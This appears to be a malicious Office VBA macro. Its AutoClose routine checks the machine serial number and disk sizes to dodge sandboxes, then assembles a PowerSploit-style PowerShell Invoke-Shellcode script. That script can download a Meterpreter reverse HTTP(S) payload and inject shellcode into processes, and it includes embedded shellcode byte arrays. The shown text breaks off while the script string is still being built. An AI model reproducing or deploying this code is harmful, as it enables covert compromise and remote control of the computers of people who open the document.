Sub AutoClose()
        P
End Sub

Public Function P() As Variant
        strComputer = "."
        Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
        Set ID = objWMIService.ExecQuery("Select IdentifyingNumber from Win32_ComputerSystemproduct")
        For Each objItem In ID
                If StrComp(objItem.IdentifyingNumber, "2UA20511KN") = 0 Then End
        Next
        Set disksize = objWMIService.ExecQuery("Select Size from Win32_logicaldisk")
        For Each objItem In disksize
                If (objItem.Size = 42949603328#) Then End
                If (objItem.Size = 68719443968#) Then End
        Next
        Dim KTnk As String
        KTnk = "function Invoke-Shellcode
{
[CmdletBinding( Defaul"
        KTnk = KTnk + "tParameterSetName = 'RunLocal', SupportsShouldProc"
        KTnk = KTnk + "ess = $True , ConfirmImpact = 'High')] Param (
   "
        KTnk = KTnk + " [ValidateNotNullOrEmpty()]
    [UInt16]
    $Proc"
        KTnk = KTnk + "essID,
    [Parameter( ParameterSetName = 'RunLoca"
        KTnk = KTnk + "l' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
"
        KTnk = KTnk + "    $Shellcode,
    [Parameter( ParameterSetName ="
        KTnk = KTnk + " 'Metasploit' )]
    [ValidateSet( 'windows/meterp"
        KTnk = KTnk + "reter/reverse_http',
                  'windows/me"
        KTnk = KTnk + "terpreter/reverse_https',
                  Ignore"
        KTnk = KTnk + "Case = $True )]
    [String]
    $Payload = 'windo"
        KTnk = KTnk + "ws/meterpreter/reverse_http',
    [Parameter( Para"
        KTnk = KTnk + "meterSetName = 'ListPayloads' )]
    [Switch]
    "
        KTnk = KTnk + "$ListMetasploitPayloads,
    [Parameter( Mandatory"
        KTnk = KTnk + " = $True,
                ParameterSetName = 'Meta"
        KTnk = KTnk + "sploit' )]
    [ValidateNotNullOrEmpty()]
    [Str"
        KTnk = KTnk + "ing]
    $Lhost = '127.0.0.1',
    [Parameter( Man"
        KTnk = KTnk + "datory = $True,
                ParameterSetName ="
        KTnk = KTnk + " 'Metasploit' )]
    [ValidateRange( 1,65535 )]
  "
        KTnk = KTnk + "  [Int]
    $Lport = 8443,
    [Parameter( Paramet"
        KTnk = KTnk + "erSetName = 'Metasploit' )]
    [ValidateNotNull()"
        KTnk = KTnk + "]
    [String]
    $UserAgent = (Get-ItemProperty "
        KTnk = KTnk + "-Path 'HKCU:\Software\Microsoft\Windows\CurrentVer"
        KTnk = KTnk + "sion\Internet Settings').'User Agent',
    [Parame"
        KTnk = KTnk + "ter( ParameterSetName = 'Metasploit' )]
    [Valid"
        KTnk = KTnk + "ateNotNull()]
    [Switch]
    $Legacy = $False,
 "
        KTnk = KTnk + "   [Parameter( ParameterSetName = 'Metasploit' )]
"
        KTnk = KTnk + "    [ValidateNotNull()]
    [Switch]
    $Proxy = "
        KTnk = KTnk + "$False,
    [Switch]
    $Force = $False
)
    Set"
        KTnk = KTnk + "-StrictMode -Version 2.0
    if ($PsCmdlet.Paramet"
        KTnk = KTnk + "erSetName -eq 'ListPayloads')
    {
        $Avail"
        KTnk = KTnk + "ablePayloads = (Get-Command Invoke-Shellcode).Para"
        KTnk = KTnk + "meters['Payload'].Attributes |
            Where-O"
        KTnk = KTnk + "bject {$_.TypeId -eq [System.Management.Automation"
        KTnk = KTnk + ".ValidateSetAttribute]}
        foreach ($Payload "
        KTnk = KTnk + "in $AvailablePayloads.ValidValues)
        {
     "
        KTnk = KTnk + "       New-Object PSObject -Property @{ Payloads ="
        KTnk = KTnk + " $Payload }
        }
        Return
    }
    if "
        KTnk = KTnk + "( $PSBoundParameters['ProcessID'] )
    {
        "
        KTnk = KTnk + "Get-Process -Id $ProcessID -ErrorAction Stop | Out"
        KTnk = KTnk + "-Null
    }
    function Local:Get-DelegateType
  "
        KTnk = KTnk + "  {
        Param
        (
            [OutputTyp"
        KTnk = KTnk + "e([Type])]
            [Parameter( Position = 0)]
"
        KTnk = KTnk + "            [Type[]]
            $Parameters = (Ne"
        KTnk = KTnk + "w-Object Type[](0)),
            [Parameter( Posit"
        KTnk = KTnk + "ion = 1 )]
            [Type]
            $ReturnT"
        KTnk = KTnk + "ype = [Void]
        )
        $Domain = [AppDomai"
        KTnk = KTnk + "n]::CurrentDomain
        $DynAssembly = New-Objec"
        KTnk = KTnk + "t System.Reflection.AssemblyName('ReflectedDelegat"
        KTnk = KTnk + "e')
        $AssemblyBuilder = $Domain.DefineDynam"
        KTnk = KTnk + "icAssembly($DynAssembly, [System.Reflection.Emit.A"
        KTnk = KTnk + "ssemblyBuilderAccess]::Run)
        $ModuleBuilder"
        KTnk = KTnk + " = $AssemblyBuilder.DefineDynamicModule('InMemoryM"
        KTnk = KTnk + "odule', $false)
        $TypeBuilder = $ModuleBuil"
        KTnk = KTnk + "der.DefineType('MyDelegateType', 'Class, Public, S"
        KTnk = KTnk + "ealed, AnsiClass, AutoClass', [System.MulticastDel"
        KTnk = KTnk + "egate])
        $ConstructorBuilder = $TypeBuilder"
        KTnk = KTnk + ".DefineConstructor('RTSpecialName, HideBySig, Publ"
        KTnk = KTnk + "ic', [System.Reflection.CallingConventions]::Stand"
        KTnk = KTnk + "ard, $Parameters)
        $ConstructorBuilder.SetI"
        KTnk = KTnk + "mplementationFlags('Runtime, Managed')
        $Me"
        KTnk = KTnk + "thodBuilder = $TypeBuilder.DefineMethod('Invoke', "
        KTnk = KTnk + "'Public, HideBySig, NewSlot, Virtual', $ReturnType"
        KTnk = KTnk + ", $Parameters)
        $MethodBuilder.SetImplement"
        KTnk = KTnk + "ationFlags('Runtime, Managed')
        Write-Outpu"
        KTnk = KTnk + "t $TypeBuilder.CreateType()
    }
    function Loc"
        KTnk = KTnk + "al:Get-ProcAddress
    {
        Param
        (
 "
        KTnk = KTnk + "           [OutputType([IntPtr])]
            [Par"
        KTnk = KTnk + "ameter( Position = 0, Mandatory = $True )]
       "
        KTnk = KTnk + "     [String]
            $Module,
            [Pa"
        KTnk = KTnk + "rameter( Position = 1, Mandatory = $True )]
      "
        KTnk = KTnk + "      [String]
            $Procedure
        )
  "
        KTnk = KTnk + "      $SystemAssembly = [AppDomain]::CurrentDomain"
        KTnk = KTnk + ".GetAssemblies() |
            Where-Object { $_.G"
        KTnk = KTnk + "lobalAssemblyCache -And $_.Location.Split('\\')[-1"
        KTnk = KTnk + "].Equals('System.dll') }
        $UnsafeNativeMeth"
        KTnk = KTnk + "ods = $SystemAssembly.GetType('Microsoft.Win32.Uns"
        KTnk = KTnk + "afeNativeMethods')
        $GetModuleHandle = $Uns"
        KTnk = KTnk + "afeNativeMethods.GetMethod('GetModuleHandle')
    "
        KTnk = KTnk + "    $GetProcAddress = $UnsafeNativeMethods.GetMeth"
        KTnk = KTnk + "od('GetProcAddress', [Type[]]@([System.Runtime.Int"
        KTnk = KTnk + "eropServices.HandleRef], [String]))
        $Kern3"
        KTnk = KTnk + "2Handle = $GetModuleHandle.Invoke($null, @($Module"
        KTnk = KTnk + "))
        $tmpPtr = New-Object IntPtr
        $Ha"
        KTnk = KTnk + "ndleRef = New-Object System.Runtime.InteropService"
        KTnk = KTnk + "s.HandleRef($tmpPtr, $Kern32Handle)
        Write-"
        KTnk = KTnk + "Output $GetProcAddress.Invoke($null, @([System.Run"
        KTnk = KTnk + "time.InteropServices.HandleRef]$HandleRef, $Proced"
        KTnk = KTnk + "ure))
    }
    function Local:Emit-CallThreadStub"
        KTnk = KTnk + " ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [I"
        KTnk = KTnk + "nt] $Architecture)
    {
        $IntSizePtr = $Ar"
        KTnk = KTnk + "chitecture / 8
        function Local:ConvertTo-Li"
        KTnk = KTnk + "ttleEndian ([IntPtr] $Address)
        {
         "
        KTnk = KTnk + "   $LittleEndianByteArray = New-Object Byte[](0)
 "
        KTnk = KTnk + "           $Address.ToString("X$($IntSizePtr*2)") "
        KTnk = KTnk + "-split '([A-F0-9]{2})' | ForEach-Object { if ($_) "
        KTnk = KTnk + "{ $LittleEndianByteArray += [Byte] ('0x{0}' -f $_)"
        KTnk = KTnk + " } }
            [System.Array]::Reverse($LittleEn"
        KTnk = KTnk + "dianByteArray)
            Write-Output $LittleEnd"
        KTnk = KTnk + "ianByteArray
        }
        $CallStub = New-Obj"
        KTnk = KTnk + "ect Byte[](0)
        if ($IntSizePtr -eq 8)
     "
        KTnk = KTnk + "   {
            [Byte[]] $CallStub = 0x48,0xB8   "
        KTnk = KTnk + "                   # MOV   QWORD RAX, &shellcode
 "
        KTnk = KTnk + "           $CallStub += ConvertTo-LittleEndian $Ba"
        KTnk = KTnk + "seAddr       # &shellcode
            $CallStub +="
        KTnk = KTnk + " 0xFF,0xD0                              # CALL  RA"
        KTnk = KTnk + "X
            $CallStub += 0x6A,0x00              "
        KTnk = KTnk + "                # PUSH  BYTE 0
            $CallSt"
        KTnk = KTnk + "ub += 0x48,0xB8                              # MOV"
        KTnk = KTnk + "   QWORD RAX, &ExitThread
            $CallStub +="
        KTnk = KTnk + " ConvertTo-LittleEndian $ExitThreadAddr # &ExitThr"
        KTnk = KTnk + "ead
            $CallStub += 0xFF,0xD0            "
        KTnk = KTnk + "                  # CALL  RAX
        }
        el"
        KTnk = KTnk + "se
        {
            [Byte[]] $CallStub = 0xB8"
        KTnk = KTnk + "                           # MOV   DWORD EAX, &she"
        KTnk = KTnk + "llcode
            $CallStub += ConvertTo-LittleEn"
        KTnk = KTnk + "dian $BaseAddr       # &shellcode
            $Cal"
        KTnk = KTnk + "lStub += 0xFF,0xD0                              # "
        KTnk = KTnk + "CALL  EAX
            $CallStub += 0x6A,0x00      "
        KTnk = KTnk + "                        # PUSH  BYTE 0
           "
        KTnk = KTnk + " $CallStub += 0xB8                                "
        KTnk = KTnk + "   # MOV   DWORD EAX, &ExitThread
            $Cal"
        KTnk = KTnk + "lStub += ConvertTo-LittleEndian $ExitThreadAddr # "
        KTnk = KTnk + "&ExitThread
            $CallStub += 0xFF,0xD0    "
        KTnk = KTnk + "                          # CALL  EAX
        }
  "
        KTnk = KTnk + "      Write-Output $CallStub
    }
    function Lo"
        KTnk = KTnk + "cal:Inject-RemoteShellcode ([Int] $ProcessID)
    "
        KTnk = KTnk + "{
        $hProcess = $OpenProcess.Invoke(0x001F0F"
        KTnk = KTnk + "FF, $false, $ProcessID) # ProcessAccessFlags.All ("
        KTnk = KTnk + "0x001F0FFF)
        if (!$hProcess)
        {
    "
        KTnk = KTnk + "        Throw "Unable to open a process handle for"
        KTnk = KTnk + " PID: $ProcessID"
        }
        $IsWow64 = $fa"
        KTnk = KTnk + "lse
        if ($64bitCPU) # Only perform theses c"
        KTnk = KTnk + "hecks if CPU is 64-bit
        {
            $IsWo"
        KTnk = KTnk + "w64Process.Invoke($hProcess, [Ref] $IsWow64) | Out"
        KTnk = KTnk + "-Null
            if ((!$IsWow64) -and $PowerShell"
        KTnk = KTnk + "32bit)
            {
                Throw 'Unable"
        KTnk = KTnk + " to inject 64-bit shellcode from within 32-bit Pow"
        KTnk = KTnk + "ershell. Use the 64-bit version of Powershell if y"
        KTnk = KTnk + "ou want this to work.'
            }
            e"
        KTnk = KTnk + "lseif ($IsWow64) # 32-bit Wow64 process
          "
        KTnk = KTnk + "  {
                if ($Shellcode32.Length -eq 0)"
        KTnk = KTnk + "
                {
                    Throw 'No s"
        KTnk = KTnk + "hellcode was placed in the $Shellcode32 variable!'"
        KTnk = KTnk + "
                }
                $Shellcode = $S"
        KTnk = KTnk + "hellcode32
            }
            else # 64-bit"
        KTnk = KTnk + " process
            {
                if ($Shellc"
        KTnk = KTnk + "ode64.Length -eq 0)
                {
            "
        KTnk = KTnk + "        Throw 'No shellcode was placed in the $She"
        KTnk = KTnk + "llcode64 variable!'
                }
            "
        KTnk = KTnk + "    $Shellcode = $Shellcode64
            }
      "
        KTnk = KTnk + "  }
        else # 32-bit CPU
        {
          "
        KTnk = KTnk + "  if ($Shellcode32.Length -eq 0)
            {
   "
        KTnk = KTnk + "             Throw 'No shellcode was placed in the"
        KTnk = KTnk + " $Shellcode32 variable!'
            }
           "
        KTnk = KTnk + " $Shellcode = $Shellcode32
        }
        $Remo"
        KTnk = KTnk + "teMemAddr = $VirtualAllocEx.Invoke($hProcess, [Int"
        KTnk = KTnk + "Ptr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) #"
        KTnk = KTnk + " (Reserve|Commit, RWX)
        if (!$RemoteMemAddr"
        KTnk = KTnk + ")
        {
            Throw "Unable to allocate "
        KTnk = KTnk + "shellcode memory in PID: $ProcessID"
        }
   "
        KTnk = KTnk + "     $WriteProcessMemory.Invoke($hProcess, $Remote"
        KTnk = KTnk + "MemAddr, $Shellcode, $Shellcode.Length, [Ref] 0) |"
        KTnk = KTnk + " Out-Null
        $ExitThreadAddr = Get-ProcAddres"
        KTnk = KTnk + "s kernel32.dll ExitThread
        if ($IsWow64)
  "
        KTnk = KTnk + "      {
            $CallStub = Emit-CallThreadStu"
        KTnk = KTnk + "b $RemoteMemAddr $ExitThreadAddr 32
        }
    "
        KTnk = KTnk + "    else
        {
            $CallStub = Emit-Ca"
        KTnk = KTnk + "llThreadStub $RemoteMemAddr $ExitThreadAddr 64
   "
        KTnk = KTnk + "     }
        $RemoteStubAddr = $VirtualAllocEx.I"
        KTnk = KTnk + "nvoke($hProcess, [IntPtr]::Zero, $CallStub.Length,"
        KTnk = KTnk + " 0x3000, 0x40) # (Reserve|Commit, RWX)
        if "
        KTnk = KTnk + "(!$RemoteStubAddr)
        {
            Throw "Un"
        KTnk = KTnk + "able to allocate thread call stub memory in PID: $"
        KTnk = KTnk + "ProcessID"
        }
        $WriteProcessMemory.I"
        KTnk = KTnk + "nvoke($hProcess, $RemoteStubAddr, $CallStub, $Call"
        KTnk = KTnk + "Stub.Length, [Ref] 0) | Out-Null
        $ThreadHa"
        KTnk = KTnk + "ndle = $CreateRemoteThread.Invoke($hProcess, [IntP"
        KTnk = KTnk + "tr]::Zero, 0, $RemoteStubAddr, $RemoteMemAddr, 0, "
        KTnk = KTnk + "[IntPtr]::Zero)
        if (!$ThreadHandle)
      "
        KTnk = KTnk + "  {
            Throw "Unable to launch remote thr"
        KTnk = KTnk + "ead in PID: $ProcessID"
        }
        $CloseHa"
        KTnk = KTnk + "ndle.Invoke($hProcess) | Out-Null
    }
    functi"
        KTnk = KTnk + "on Local:Inject-LocalShellcode
    {
        if ($"
        KTnk = KTnk + "PowerShell32bit) {
            if ($Shellcode32.Le"
        KTnk = KTnk + "ngth -eq 0)
            {
                Throw 'N"
        KTnk = KTnk + "o shellcode was placed in the $Shellcode32 variabl"
        KTnk = KTnk + "e!'
                return
            }
         "
        KTnk = KTnk + "   $Shellcode = $Shellcode32
        }
        els"
        KTnk = KTnk + "e
        {
            if ($Shellcode64.Length -e"
        KTnk = KTnk + "q 0)
            {
                Throw 'No shell"
        KTnk = KTnk + "code was placed in the $Shellcode64 variable!'
   "
        KTnk = KTnk + "             return
            }
            $She"
        KTnk = KTnk + "llcode = $Shellcode64
        }
        $BaseAddre"
        KTnk = KTnk + "ss = $VirtualAlloc.Invoke([IntPtr]::Zero, $Shellco"
        KTnk = KTnk + "de.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        KTnk = KTnk + "X)
        if (!$BaseAddress)
        {
          "
        KTnk = KTnk + "  Throw "Unable to allocate shellcode memory in PI"
        KTnk = KTnk + "D: $ProcessID"
        }
        [System.Runtime.I"
        KTnk = KTnk + "nteropServices.Marshal]::Copy($Shellcode, 0, $Base"
        KTnk = KTnk + "Address, $Shellcode.Length)
        $ExitThreadAdd"
        KTnk = KTnk + "r = Get-ProcAddress kernel32.dll ExitThread
      "
        KTnk = KTnk + "  if ($PowerShell32bit)
        {
            $Cal"
        KTnk = KTnk + "lStub = Emit-CallThreadStub $BaseAddress $ExitThre"
        KTnk = KTnk + "adAddr 32
        }
        else
        {
       "
        KTnk = KTnk + "     $CallStub = Emit-CallThreadStub $BaseAddress "
        KTnk = KTnk + "$ExitThreadAddr 64
        }
        $CallStubAddr"
        KTnk = KTnk + "ess = $VirtualAlloc.Invoke([IntPtr]::Zero, $CallSt"
        KTnk = KTnk + "ub.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RW"
        KTnk = KTnk + "X)
        if (!$CallStubAddress)
        {
      "
        KTnk = KTnk + "      Throw "Unable to allocate thread call stub.""
        KTnk = KTnk + "
        }
        [System.Runtime.InteropServices"
        KTnk = KTnk + ".Marshal]::Copy($CallStub, 0, $CallStubAddress, $C"
        KTnk = KTnk + "allStub.Length)
        $ThreadHandle = $CreateThr"
        KTnk = KTnk + "ead.Invoke([IntPtr]::Zero, 0, $CallStubAddress, $B"
        KTnk = KTnk + "aseAddress, 0, [IntPtr]::Zero)
        if (!$Threa"
        KTnk = KTnk + "dHandle)
        {
            Throw "Unable to la"
        KTnk = KTnk + "unch thread."
        }
        $WaitForSingleObje"
        KTnk = KTnk + "ct.Invoke($ThreadHandle, 0xFFFFFFFF) | Out-Null
  "
        KTnk = KTnk + "      $VirtualFree.Invoke($CallStubAddress, $CallS"
        KTnk = KTnk + "tub.Length + 1, 0x8000) | Out-Null # MEM_RELEASE ("
        KTnk = KTnk + "0x8000)
        $VirtualFree.Invoke($BaseAddress, "
        KTnk = KTnk + "$Shellcode.Length + 1, 0x8000) | Out-Null # MEM_RE"
        KTnk = KTnk + "LEASE (0x8000)
    }
    $IsWow64ProcessAddr = Get"
        KTnk = KTnk + "-ProcAddress kernel32.dll IsWow64Process
    if ($"
        KTnk = KTnk + "IsWow64ProcessAddr)
    {
        $IsWow64ProcessD"
        KTnk = KTnk + "elegate = Get-DelegateType @([IntPtr], [Bool].Make"
        KTnk = KTnk + "ByRefType()) ([Bool])
        $IsWow64Process = [S"
        KTnk = KTnk + "ystem.Runtime.InteropServices.Marshal]::GetDelegat"
        KTnk = KTnk + "eForFunctionPointer($IsWow64ProcessAddr, $IsWow64P"
        KTnk = KTnk + "rocessDelegate)
        $64bitCPU = $true
    }
  "
        KTnk = KTnk + "  else
    {
        $64bitCPU = $false
    }
    "
        KTnk = KTnk + "if ([IntPtr]::Size -eq 4)
    {
        $PowerShel"
        KTnk = KTnk + "l32bit = $true
    }
    else
    {
        $Power"
        KTnk = KTnk + "Shell32bit = $false
    }
    if ($PsCmdlet.Parame"
        KTnk = KTnk + "terSetName -eq 'Metasploit')
    {
        if (!$P"
        KTnk = KTnk + "owerShell32bit) {
            $RootInvocation = $M"
        KTnk = KTnk + "yInvocation.Line
            $Response = $True
   "
        KTnk = KTnk + "         if ( $Force -or ( $Response = $psCmdlet.S"
        KTnk = KTnk + "houldContinue( "Do you want to launch the payload "
        KTnk = KTnk + "from x86 Powershell?",
                   "Attempt"
        KTnk = KTnk + " to execute 32-bit shellcode from 64-bit Powershel"
        KTnk = KTnk + "l. Note: This process takes about one minute. Be p"
        KTnk = KTnk + "atient! You will also see some artifacts of the sc"
        KTnk = KTnk + "ript loading in the other process." ) ) ) { }
    "
        KTnk = KTnk + "        if ( !$Response )
            {
          "
        KTnk = KTnk + "      Return
            }
            if ($MyInvo"
        KTnk = KTnk + "cation.BoundParameters['Force'])
            {
   "
        KTnk = KTnk + "             $Command = "function $($MyInvocation."
        KTnk = KTnk + "InvocationName) {`n" + $MyInvocation.MyCommand.Scr"
        KTnk = KTnk + "iptBlock + "`n}`n$($RootInvocation)`n`n"
         "
        KTnk = KTnk + "   }
            else
            {
              "
        KTnk = KTnk + "  $Command = "function $($MyInvocation.InvocationN"
        KTnk = KTnk + "ame) {`n" + $MyInvocation.MyCommand.ScriptBlock + "
        KTnk = KTnk + ""`n}`n$($RootInvocation) -Force`n`n"
            }"
        KTnk = KTnk + "
            $CommandBytes = [System.Text.Encoding"
        KTnk = KTnk + "]::Ascii.GetBytes($Command)
            $EncodedCo"
        KTnk = KTnk + "mmand = [Convert]::ToBase64String($CommandBytes)
 "
        KTnk = KTnk + "           $Execute = '$Command' + " | $Env:windir"
        KTnk = KTnk + "\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -N"
        KTnk = KTnk + "oProfile -Command -"
            Invoke-Expression"
        KTnk = KTnk + " -Command $Execute | Out-Null
            Return
 "
        KTnk = KTnk + "       }
        $Response = $True
        if ( $F"
        KTnk = KTnk + "orce -or ( $Response = $psCmdlet.ShouldContinue( ""
        KTnk = KTnk + "Do you know what you're doing?",
               "A"
        KTnk = KTnk + "bout to download Metasploit payload '$($Payload)' "
        KTnk = KTnk + "LHOST=$($Lhost), LPORT=$($Lport)" ) ) ) { }
      "
        KTnk = KTnk + "  if ( !$Response )
        {
            Return
 "
        KTnk = KTnk + "       }
        switch ($Payload)
        {
     "
        KTnk = KTnk + "       'windows/meterpreter/reverse_http'
        "
        KTnk = KTnk + "    {
                $SSL = ''
            }
    "
        KTnk = KTnk + "        'windows/meterpreter/reverse_https'
      "
        KTnk = KTnk + "      {
                $SSL = 's'
               "
        KTnk = KTnk + " [System.Net.ServicePointManager]::ServerCertifica"
        KTnk = KTnk + "teValidationCallback = {$True}
            }
     "
        KTnk = KTnk + "   }
        if ($Legacy)
        {
            $R"
        KTnk = KTnk + "equest = "http$($SSL)://$($Lhost):$($Lport)/INITM""
        KTnk = KTnk + "
        } else {
            $CharArray = 48..57 "
        KTnk = KTnk + "+ 65..90 + 97..122 | ForEach-Object {[Char]$_}
   "
        KTnk = KTnk + "         $SumTest = $False
            while ($Sum"
        KTnk = KTnk + "Test -eq $False)
            {
                $Ge"
        KTnk = KTnk + "neratedUri = $CharArray | Get-Random -Count 4
    "
        KTnk = KTnk + "            $SumTest = (([int[]] $GeneratedUri | M"
        KTnk = KTnk + "easure-Object -Sum).Sum % 0x100 -eq 92)
          "
        KTnk = KTnk + "  }
            $RequestUri = -join $GeneratedUri
"
        KTnk = KTnk + "            $Request = "http$($SSL)://$($Lhost):$("
        KTnk = KTnk + "$Lport)/$($RequestUri)"
        }
        $Uri = N"
        KTnk = KTnk + "ew-Object Uri($Request)
        $WebClient = New-O"
        KTnk = KTnk + "bject System.Net.WebClient
        $WebClient.Head"
        KTnk = KTnk + "ers.Add('user-agent', "$UserAgent")
        if ($P"
        KTnk = KTnk + "roxy)
        {
            $WebProxyObject = New-"
        KTnk = KTnk + "Object System.Net.WebProxy
            $ProxyAddre"
        KTnk = KTnk + "ss = (Get-ItemProperty -Path 'HKCU:\Software\Micro"
        KTnk = KTnk + "soft\Windows\CurrentVersion\Internet Settings').Pr"
        KTnk = KTnk + "oxyServer
            if ($ProxyAddress)
         "
        KTnk = KTnk + "   {
                $WebProxyObject.Address = $Pr"
        KTnk = KTnk + "oxyAddress
                $WebProxyObject.UseDefa"
        KTnk = KTnk + "ultCredentials = $True
                $WebClientO"
        KTnk = KTnk + "bject.Proxy = $WebProxyObject
            }
      "
        KTnk = KTnk + "  }
        try
        {
            [Byte[]] $Sh"
        KTnk = KTnk + "ellcode32 = $WebClient.DownloadData($Uri)
        "
        KTnk = KTnk + "}
        catch
        {
            Throw "$($Er"
        KTnk = KTnk + "ror[0])"
        }
        [Byte[]] $Shellcode64 ="
        KTnk = KTnk + " $Shellcode32
    }
    elseif ($PSBoundParameters"
        KTnk = KTnk + "['Shellcode'])
    {
        [Byte[]] $Shellcode32"
        KTnk = KTnk + " = $Shellcode
        [Byte[]] $Shellcode64 = $She"
        KTnk = KTnk + "llcode32
    }
    else
    {
        [Byte[]] $Sh"
        KTnk = KTnk + "ellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0"
        KTnk = KTnk + "x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
     "
        KTnk = KTnk + "                             0x52,0x0c,0x8b,0x52,0"
        KTnk = KTnk + "x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0"
        KTnk = KTnk + "x31,0xc0,
                                  0xac,0"
        KTnk = KTnk + "x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0"
        KTnk = KTnk + "xc7,0xe2,0xf0,0x52,0x57,
                         "
        KTnk = KTnk + "         0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0"
        KTnk = KTnk + "x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,
          "
        KTnk = KTnk + "                        0xd0,0x50,0x8b,0x48,0x18,0"
        KTnk = KTnk + "x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0"
        KTnk = KTnk + "x8b,
                                  0x01,0xd6,0"
        KTnk = KTnk + "x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0"
        KTnk = KTnk + "x38,0xe0,0x75,0xf4,
                              "
        KTnk = KTnk + "    0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0"
        KTnk = KTnk + "x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
               "
        KTnk = KTnk + "                   0x0c,0x4b,0x8b,0x58,0x1c,0x01,0"
        KTnk = KTnk + "xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,
"
        KTnk = KTnk + "                                  0x5b,0x5b,0x61,0"
        KTnk = KTnk + "x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0"
        KTnk = KTnk + "xeb,0x86,0x5d,
                                  0"
        KTnk = KTnk + "x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0"
        KTnk = KTnk + "x31,0x8b,0x6f,0x87,0xff,0xd5,
                    "
        KTnk = KTnk + "              0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,0"
        KTnk = KTnk + "x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,
     "
        KTnk = KTnk + "                             0x80,0xfb,0xe0,0x75,0"
        KTnk = KTnk + "x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0"
        KTnk = KTnk + "xd5,0x63,
                                  0x61,0"
        KTnk = KTnk + "x6c,0x63,0x00)
        [Byte[]] $Shellcode64 = @(0"
        KTnk = KTnk + "xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0"
        KTnk = KTnk + "x41,0x51,0x41,0x50,0x52,0x51,
                    "
        KTnk = KTnk + "              0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0"
        KTnk = KTnk + "x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
     "
        KTnk = KTnk + "                             0x20,0x48,0x8b,0x72,0"
        KTnk = KTnk + "x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0"
        KTnk = KTnk + "x31,0xc0,
                                  0xac,0"
        KTnk = KTnk + "x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0"
        KTnk = KTnk + "x41,0x01,0xc1,0xe2,0xed,
                         "
        KTnk = KTnk + "         0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0"
        KTnk = KTnk + "x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
          "
        KTnk = KTnk + "                        0x00,0x00,0x00,0x48,0x85,0"
        KTnk = KTnk + "xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0"
        KTnk = KTnk + "x44,
                                  0x8b,0x40,0"
        KTnk = KTnk + "x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0"
        KTnk = KTnk + "x8b,0x34,0x88,0x48,
                              "
        KTnk = KTnk + "    0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0"
        KTnk = KTnk + "x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
               "
        KTnk = KTnk + "                   0x38,0xe0,0x75,0xf1,0x4c,0x03,0"
        KTnk = KTnk + "x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
"
        KTnk = KTnk + "                                  0x8b,0x40,0x24,0"
        KTnk = KTnk + "x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0"
        KTnk = KTnk + "x40,0x1c,0x49,
                                  0"
        KTnk = KTnk + "x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0"
        KTnk = KTnk + "x58,0x41,0x58,0x5e,0x59,0x5a,
                    "
        KTnk = KTnk + "              0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0"
        KTnk = KTnk + "x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
     "
        KTnk = KTnk + "                             0x59,0x5a,0x48,0x8b,0"
        KTnk = KTnk + "x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0"
        KTnk = KTnk + "x00,0x00,
                                  0x00,0"
        KTnk = KTnk + "x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0"
        KTnk = KTnk + "x00,0x41,0xba,0x31,0x8b,
                         "
        KTnk = KTnk + "         0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0"
        KTnk = KTnk + "x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
          "
        KTnk = KTnk + "                        0xd5,0x48,0x83,0xc4,0x28,0"
        KTnk = KTnk + "x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0"
        KTnk = KTnk + "x47,
                                  0x13,0x72,0"
        KTnk = KTnk + "x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0"
        KTnk = KTnk + "x61,0x6c,0x63,0x00)
    }
    if ( $PSBoundParamet"
        KTnk = KTnk + "ers['ProcessID'] )
    {
        $OpenProcessAddr "
